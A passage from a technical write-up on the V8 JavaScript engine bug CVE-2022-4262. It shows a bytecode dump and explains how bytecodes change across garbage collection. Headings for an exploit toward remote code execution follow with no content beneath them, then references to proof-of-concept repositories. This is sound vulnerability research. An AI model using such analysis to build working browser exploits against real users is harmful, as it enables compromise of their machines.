         0x3fe00025c49f @  109 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025c4a1 @  111 : 65 29 00 f7 04    CallRuntime [DefineClass], r3-r6
         0x3fe00025c4a6 @  116 : 0b f8             Ldar r2
         0x3fe00025c4a8 @  118 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025c4aa @  120 : 80 0e 01 02       CreateClosure [14], [1], #2
         0x3fe00025c4ae @  124 : c1                Star3
         0x3fe00025c4af @  125 : 32 f8 0f 13       SetNamedProperty r2, [15], [19]
         0x3fe00025c4b3 @  129 : 1b f9             PopContext r1
         0x3fe00025c4b5 @  131 : 0b f8             Ldar r2
         0x3fe00025c4b7 @  133 : 8a 04             Jump [4] (0x3fe00025c4bb @ 137)
         0x3fe00025c4b9 @  135 : 0b 03             Ldar a0
         0x3fe00025c4bb @  137 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025c4bd @  139 : 0e                LdaUndefined
         0x3fe00025c4be @  140 : a9                Return
Constant pool (size = 16)
0x3fe00025c3b1: [FixedArray] in OldSpace
 - map: 0x3fe000002231 <Map(FIXED_ARRAY_TYPE)>
 - length: 16
           0: 0x3fe00025c205 <ScopeInfo FUNCTION_SCOPE>
           1: 0x3fe00025c235 <ScopeInfo CLASS_SCOPE>
           2: 0x3fe00025c38d <FixedArray[7]>
           3: 0x3fe00025c289 <SharedFunctionInfo b3>
           4: 0x3fe00025c2e9 <ObjectBoilerplateDescription[7]>
           5: 0x3fe000006005 <String[4]: #eval>
           6: 0x3fe0000040a5 <String[1]: #c>
           7: 0x3fe00025a359 <String[5]: #dummy>
           8: 0x3fe0000040b5 <String[1]: #d>
           9: 0x3fe0000040c5 <String[1]: #e>
          10: 0x3fe00025c3f9 <HeapNumber 3735927789.0>
          11: 0x3fe00025c19d <String[2]: #aa>
          12: 0x3fe00025c405 <HeapNumber 3735928559.0>
          13: 0x3fe00025c1ad <String[2]: #bb>
          14: 0x3fe00025c2c1 <SharedFunctionInfo <instance_members_initializer>>
          15: 0x3fe0000071e5 <Symbol: (class_fields_symbol)>
Handler Table (size = 0)
Source Position Table (size = 0)
```

#### Bytecode Diff across GC

Through comparation, we could find that many bytecodes before GC are replaced with new types of bytecodes after GC, such as:
- `LdaGlobal` -> `LdaLookupGlobalSlot`
- `LdaContextSlot` -> `LdaLookupContextSlot`
- `StaGlobal` -> `StaLookupSlot`

This is exactly the reason why the type of feedback slot changed across GC. The reason why bytecodes got changed will be presented in the next section, Root Cause Analysis.

![](images/PoC_Bytecode_Diff.png)

# Root Cause Analysis

# Simplified Exploit

# Exploit Primitive in V8 Sandbox

# Exploit for RCE

# Conclusion

# Reference
1. <a id="RefList-1" href="https://github.com/bjrjk/CVE-2022-4262/blob/main/RCA/RCA.md">CVE-2022-4262/RCA/RCA.md at main · bjrjk/CVE-2022-4262</a>
2. <a id="RefList-2" href="https://github.com/mistymntncop/CVE-2022-4262">mistymntncop/CVE-2022-4262</a>
3. <a id="RefList-3" href="https://v8.dev/blog/v8-lite#bytecode-flushing">Bytecode flushing - A lighter V8 · V8</a>
4. <a id="RefList-4" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode">Strict mode - JavaScript | MDN</a>
5. <a id="RefList-5" href="https://developer.mozilla.org/en-US/docs/Glossary/Scope">Scope - MDN Web Docs Glossary: Definitions of Web-related terms | MDN</a>
6. <a id="RefList-6" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">eval() - JavaScript | MDN</a>
7. <a id="RefList-7" href="https://whereswalden.com/2011/01/10/new-es5-strict-mode-support-new-vars-created-by-strict-mode-eval-code-are-local-to-that-code-only/">Where&#039;s Walden? &raquo; New ES5 strict mode support: new vars created by strict mode eval code are local to that code only</a>
8. <a id="RefList-8" href="https://mathiasbynens.be/notes/shapes-ics">JavaScript engine fundamentals: Shapes and Inline Caches · Mathias Bynens</a>
9. <a id="RefList-9" href="https://en.wikipedia.org/wiki/Inline_caching#Monomorphic_inline_caching">Monomorphic inline caching - Inline caching - Wikipedia</a>
10. <a id="RefList-10" href="https://v8.dev/docs/hidden-classes">Maps (Hidden Classes) in V8 · V8</a>
11. <a id="RefList-11" href="https://stackoverflow.com/questions/45474802/could-you-explain-sender-and-receiver-in-oop-and-give-examples">object - Could you explain sender and receiver in OOP and give examples? - Stack Overflow</a>
12. <a id="RefList-12" href="https://github.com/mistymntncop/CVE-2022-4262/blob/main/test.js">CVE-2022-4262/test.js at main · mistymntncop/CVE-2022-4262</a>
13. <a id="RefList-13" href="https://v8.dev/docs/build">Building V8 from source · V8</a>
14. <a id="RefList-14" href="https://blog.csdn.net/Moyun_vackbot/article/details/122434876">Chrome V8引擎类型混淆漏洞分析(CVE-2021-38001)-CSDN博客</a>
15. <a id="RefList-15" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer#computed_property_names">Object initializer - JavaScript | MDN</a>
16. <a id="RefList-16" href="https://262.ecma-international.org/12.0/#sec-conditional-operator">ECMAScript 2021 Language Specification - Conditional Operator</a>
